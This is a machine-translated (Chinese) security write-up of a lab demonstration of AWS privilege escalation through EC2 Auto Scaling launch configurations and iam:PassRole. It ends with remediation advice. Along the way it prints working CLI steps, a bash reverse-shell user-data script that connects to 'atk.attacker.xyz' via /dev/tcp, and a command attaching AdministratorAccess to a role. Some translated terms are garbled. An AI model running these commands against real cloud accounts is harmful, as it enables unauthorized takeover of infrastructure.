<html>
<head>
<title>AWS EC2 Auto Scaling Privilege Escalation</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">AWS EC2自动扩展权限升级</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/aws-ec2-auto-scaling-privilege-escalation-d518f8e7f91b?source=collection_archive---------0-----------------------#2022-07-19">https://infosecwriteups.com/aws-ec2-auto-scaling-privilege-escalation-d518f8e7f91b?source=collection_archive---------0-----------------------#2022-07-19</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="29d9" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">介绍</h1><p id="ec8e" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">本文是关于滥用AWS托管策略和默认配置的权限提升。</p><p id="5cdf" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">IAM在AWS上的权限错误配置和权限提升在过去已经被彻底讨论过，特别是来自<a class="ae lo" href="https://rhinosecuritylabs.com/blog/" rel="noopener ugc nofollow" target="_blank"> Rhino Security Labs </a>和<a class="ae lo" href="https://bishopfox.com/" rel="noopener ugc nofollow" target="_blank"> Bishop Fox </a>的讨论，所以我创建了一个AWS laboratory account来测试对AWS基础设施的新旧攻击，特别是IAM服务。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi lp"><img src="../Images/91f570a40032acfc6919b799f07f1b19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3ImmaxnHKzUPrsUc.png"/></div></div></figure><p id="67e7" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">在搜索亚马逊托管策略及其组合提供的奇怪权限时，发现策略<a class="ae lo" href="https://console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonElasticMapReduceFullAccess" rel="noopener ugc nofollow" target="_blank">AmazonElasticMapReduceFullAccess</a>(V7)允许经典的权限提升权限<em class="mb"> iam:PassRole </em>和<em class="mb"> ec2:RunInstance </em>(以及许多其他权限！).</p><p id="e5f8" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">这并不新鲜，因为有了这两个权限，就可以创建一个新的EC2实例，传递一个比实际用户权限更高的角色，登录到实例中，并在EC2服务中使用假定的角色。</p><p id="0c22" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="mb"> iam:PassRole </em>权限可以允许服务承担角色并代表它执行操作。</p><p id="a287" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">任何AWS专业人员都将避免使用该策略或创建一个拒绝策略，以至少将<em class="mb"> iam:PassRole </em>限制为特定的角色或服务。</p><h1 id="a7a2" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">输入数据科学家</h1><p id="1667" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated"><a class="ae lo" href="https://searchaws.techtarget.com/definition/Amazon-Elastic-MapReduce-Amazon-EMR" rel="noopener ugc nofollow" target="_blank">Amazon Elastic Map Reduce</a>(EMR)服务是一个大数据平台，用于运行大规模分布式数据处理作业、SQL查询和机器学习(ML)应用程序，因此我搜索了应该与data scientist用户相关联的其他策略。</p><p id="ee19" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">显然，由于以下权限，数据科学家策略引起了我的注意:</p><ul class=""><li id="5086" class="mc md iq kn b ko lj ks lk kw me la mf le mg li mh mi mj mk bi translated"><em class="mb">cloud formation:create stack</em></li><li id="cbc1" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb">λ:创造* </em></li><li id="d907" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb">λ:更新* </em></li><li id="64f2" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb">λ:invoke function</em></li></ul><p id="8f48" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">这个策略只是一个定时炸弹，因为如果攻击者用户/角色获得了<em class="mb"> iam:PassRole </em>权限，就可以执行大量滥用CloudFormation堆栈、自定义Lambda函数、EC2实例等权限提升路径。</p><p id="10c3" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">亚马逊意识到了这个问题，并决定放弃这个政策。事实上，新策略已经限制了对<em class="mb"> iam:PassRole </em>的权限。</p><p id="8387" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">为了增加难度，一个名为<em class="mb">的策略被创造出来。该策略明确拒绝以下操作:</em></p><ul class=""><li id="41a6" class="mc md iq kn b ko lj ks lk kw me la mf le mg li mh mi mj mk bi translated"><em class="mb">云形成:创建堆栈</em></li><li id="8f53" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb">cloud formation:update stack</em></li><li id="f68a" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb"> ec2:运行实例</em></li><li id="88d9" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb">λ:创建* </em></li><li id="e7bb" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb">λ:更新* </em></li><li id="02f9" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb">λ:invoke function</em></li></ul><p id="8b33" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">从DataScientist policy中，另一个操作引起了注意<em class="mb">自动缩放:*。</em></p><p id="1ff5" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">既然上面的策略拒绝了传统的权限提升途径，有趣的途径是使用EC2自动缩放服务来执行权限提升。</p><p id="c001" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">场景很简单:</p><ul class=""><li id="833d" class="mc md iq kn b ko lj ks lk kw me la mf le mg li mh mi mj mk bi translated">攻击者可以访问一个<em class="mb">演示数据科学家</em>角色，并附带三个策略<em class="mb">数据科学家</em>、<em class="mb">AmazonElasticMapReduceFullAccess</em>和<em class="mb"> DemoDenyPrivEscs </em></li><li id="1171" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">在该帐户中，有一个可以由EC2承担的特权角色，称为demo- <em class="mb"> EC2Admin </em></li></ul><p id="9b2a" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><strong class="kn ir">注意:</strong>明显地在全局范围内拒绝<em class="mb"> iam:PassRole </em>将基本上阻止所有主要的特权升级；但是我们在这里做实验。</p><h1 id="d15d" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">使用EC2自动扩展的权限提升</h1><p id="dd0f" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated"><strong class="kn ir">如果您从未使用过自动缩放功能，则AWSServiceRoleForAutoScaling不能用于启动服务。</strong></p><p id="c716" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">Amazon EC2 Auto Scaling service帮助组织扩展EC2实例以维护应用程序可用性，并允许他们根据定义的工作负载规则自动启动或终止实例。</p><p id="2f09" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">该服务需要启动配置和自动扩展组:</p><ul class=""><li id="3a88" class="mc md iq kn b ko lj ks lk kw me la mf le mg li mh mi mj mk bi translated">启动配置创建EC2实例运行时使用的模板；</li><li id="ba5c" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">自动缩放组用于定义缩放配置和规则。</li></ul><p id="db5b" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="mb"> demo-DataScientist </em>然后可以创建EC2启动配置和带有AMI映像的自动扩展组，攻击者可以访问该映像。</p><p id="d5f8" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">启动配置是EC2自动缩放组用来启动EC2实例的模板。创建启动配置时，会指定实例的信息，例如Amazon机器映像(AMI)的ID、实例类型、密钥对、一个或多个安全组以及块设备映射。</p><p id="fc1e" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">然后，攻击者创建一个启动配置，该配置:</p><ul class=""><li id="d277" class="mc md iq kn b ko lj ks lk kw me la mf le mg li mh mi mj mk bi translated">使用角色demo-EC2Admin</li><li id="9069" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">使用支持用户数据脚本的AMI映像</li><li id="f335" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">[可选]为了简单起见，启用IMDSv1</li></ul><p id="dfda" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">攻击者现在找到最新的Amazon AMI(默认安装AWSCLI并支持用户数据脚本):</p><pre class="lq lr ls lt gt mq mr ms mt aw mu bi"><span id="31af" class="mv jo iq mr b gy mw mx l my mz">aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'</span></pre><p id="2742" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">攻击者使用的AMI映像必须能够被攻击者自己访问，有一些选择:</p><ul class=""><li id="1481" class="mc md iq kn b ko lj ks lk kw me la mf le mg li mh mi mj mk bi translated">使用用户名和密码(或攻击者已知的密钥对)进行SSH访问的AMI，附带允许SSH流量的公共IP地址和安全组</li><li id="257b" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">一个定制的公共AMI，在启动时执行一个脚本/例程以连接到外部机器(即反向外壳)</li><li id="d600" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">启动时执行脚本/例程以使用用户数据配置连接到外部机器(即反向外壳)的AMI</li><li id="7faa" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">使用攻击者可以利用的AWS帐户的已配置安全组暴露具有易受攻击服务的AMI</li></ul><p id="4145" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">在这个阶段，目标是访问实例。</p><p id="6d09" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">使用上面的输出，可以创建一个启动配置:</p><pre class="lq lr ls lt gt mq mr ms mt aw mu bi"><span id="7419" class="mv jo iq mr b gy mw mx l my mz">aws autoscaling create-launch-configuration --launch-configuration-name demo-LC --image-id ami-0f90b6b11936e1083 --instance-type t1.micro --iam-instance-profile demo-EC2Admin --metadata-options "HttpEndpoint=enabled,HttpTokens=optional" --associate-public-ip-address --user-data=file://reverse-shell.sh</span></pre><p id="9e05" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="mb"> reverse-shell.sh </em>文件包含启动时在EC2上执行的脚本:</p><pre class="lq lr ls lt gt mq mr ms mt aw mu bi"><span id="9f31" class="mv jo iq mr b gy mw mx l my mz">#!/bin/bash</span><span id="4b93" class="mv jo iq mr b gy na mx l my mz">/bin/bash -l &gt; /dev/tcp/atk.attacker.xyz/443 0&lt;&amp;1 2&gt;&amp;1</span></pre><p id="97ca" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">该脚本只是使用<em class="mb"> Bash </em>执行一个反向shell，允许攻击者在不访问AWS VPC或EC2 SSH密钥的情况下访问启动的EC2实例。</p><p id="fc48" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">一般来说，任何类型的反向外壳都可以使用，因为攻击者可以伪造启动脚本；更复杂的问题可能涉及混淆、更稳定的连接、复杂信标的下载、持久性和恶意软件。</p><p id="1983" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">现在已经创建了启动配置；该服务还需要一个自动缩放策略来启动/停止实例。</p><p id="2dc9" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">攻击者然后使用上面创建的启动配置<em class="mb"> evilLC </em>来创建自动缩放组，以实际启动EC2实例:</p><pre class="lq lr ls lt gt mq mr ms mt aw mu bi"><span id="7266" class="mv jo iq mr b gy mw mx l my mz">aws autoscaling create-auto-scaling-group --auto-scaling-group-name demo-ASG --launch-configuration-name demo-LC --min-size 1 --max-size 1 --vpc-zone-identifier "subnet-aaaabbb"</span></pre><p id="0fa2" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">选择的VPC子网应该至少允许从EC2到攻击者IP和端口的出口流量；通常情况下，出口安全组非常广泛，攻击者有太多的选择。</p><p id="ab45" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">使用<em class="mb">AmazonElasticMapReduceFullAccess</em>中定义的<em class="mb"> ec2:DescribeSubnets </em>权限，攻击者可以选择适当的子网id。</p><p id="a4b6" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">创建自动缩放组后，AWS会检查ec2的数量是否在定义的自动缩放策略的限制范围内。由于该扩展组中没有可用的EC2，因此会创建一个新的EC2，然后再衍生。</p><p id="d866" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">在实例的引导上，攻击者服务器会收到一个反向外壳:</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/c4ed7ad97255ef4160e79902a63c0c04.png" data-original-src="https://miro.medium.com/v2/resize:fit:842/0*Etls_KOMMU7xHZRy"/></div><figcaption class="nc nd gj gh gi ne nf bd b be z dk translated">从EC2反转外壳</figcaption></figure><p id="0052" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">有了这个shell，现在可以在EC2实例中使用<em class="mb"> demo-EC2Admin </em>角色，或者使用简单的HTTP GET请求将会话令牌转储到IMDS。</p><p id="93a0" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">由于AWS意识到EC2角色不应该在AWS组织之外使用，因此从AWS外部使用会话令牌会触发一个带有签名<em class="mb">unauthorized access:iam user/instanceredentialexfiltration的警报。窗外</em>。</p><p id="88b6" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">攻击者现在可以从反向外壳获得管理权限:</p><pre class="lq lr ls lt gt mq mr ms mt aw mu bi"><span id="7268" class="mv jo iq mr b gy mw mx l my mz">aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name demo-DataScientist</span></pre><h1 id="ae80" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">结论</h1><p id="74d5" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">此权限提升所需的最低权限为:</p><ul class=""><li id="fd5e" class="mc md iq kn b ko lj ks lk kw me la mf le mg li mh mi mj mk bi translated"><em class="mb">自动缩放:创建自动缩放组</em>或<em class="mb">自动缩放:更新自动缩放组</em></li><li id="d040" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb">自动缩放:创建启动配置</em></li><li id="b4bb" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated"><em class="mb"> iam:PassRole </em>可以访问EC2可假设的实例概要文件</li></ul><p id="d354" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">这种权限提升很容易在您的AWS帐户上发现，特别是如果您使用IaC来部署和管理AWS资源:只需搜索任何使用<em class="mb">自动缩放:* </em>操作<em class="mb"> </em>或<em class="mb">数据科学家</em>策略与<em class="mb"> iam:PassRole </em>的组合。</p><p id="109d" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">在这个要点中，你可以找到地形代码来部署一个最小可行的场景来利用这个特权升级。</p><p id="3c2b" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><strong class="kn ir">这里的问题不是AWS托管策略的使用，而是<em class="mb">自动缩放</em>和<em class="mb"> iam:PassRole </em>权限的组合。</strong></p><p id="5533" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">要实际执行攻击，攻击者必须知道附加到EC2实例的角色名称和允许出口流量的安全组。</p><p id="069e" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">DataScientist策略允许<em class="mb"> iam:ListRole </em>，即使攻击者不知道正确的角色，也可以从列表中或通过试错法猜测出来；同样方法可以用于列出安全组、VPC和子网。</p><p id="1200" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">来自nccgroup的PMapper 能够显示这种特权，但没有说明如何实际利用它:</p><pre class="lq lr ls lt gt mq mr ms mt aw mu bi"><span id="9b29" class="mv jo iq mr b gy mw mx l my mz">In AWS, IAM Principals such as IAM Users or IAM Roles have their permissions defined using IAM Policies. These policies describe different actions, resources, and conditions where the principal can make a given API call to a service. <br/> <br/>Administrative principals can call any action with any resource, as in the AdministratorAccess AWS-managed policy. However, some permissions may allow another non-administrative principal to gain access to an administrative principal. This represents a p<br/>rivilege escalation risk.</span><span id="19ee" class="mv jo iq mr b gy na mx l my mz">* role/demo-DataScientist can escalate privileges by accessing the administrative principal role/demo-EC2Admin: <br/>  * role/demo-DataScientist can use the EC2 Auto Scaling service role and create a launch configuration to access role/demo-EC2Admin</span></pre><h1 id="27b7" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">补救</h1><p id="72d5" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">一个快速解决方案是创建一个策略来拒绝角色或用户的自动扩展权限，但这应该只是一个补丁，以允许对<em class="mb"> iam:PassRole </em>权限进行更精确的补救和调整。</p><p id="1728" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">补救措施是遵循身份和访问管理的AWS安全最佳实践:</p><ul class=""><li id="34f8" class="mc md iq kn b ko lj ks lk kw me la mf le mg li mh mi mj mk bi translated">使用授予最低权限的策略，或仅授予执行任务所需的权限。授予最小权限的最安全的方法是编写一个自定义策略，只包含用户/角色所需的权限；</li><li id="09a3" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">使用<a class="ae lo" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html" rel="noopener ugc nofollow" target="_blank">访问分析器</a>服务来验证和减少未使用的特权；</li><li id="3246" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">定期审查政策并进行评估，以发现错误配置；</li><li id="8fa5" class="mc md iq kn b ko ml ks mm kw mn la mo le mp li mh mi mj mk bi translated">监控AWS帐户上的IAM活动</li></ul><p id="ee15" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">根据经验，最好的方法是避免使用AWS管理的策略，因为创建它们只是为了让事情顺利进行，而不是带来麻烦，并且<em class="mb">被设计为</em>过于宽松。</p></div></div>    
</body>
</html>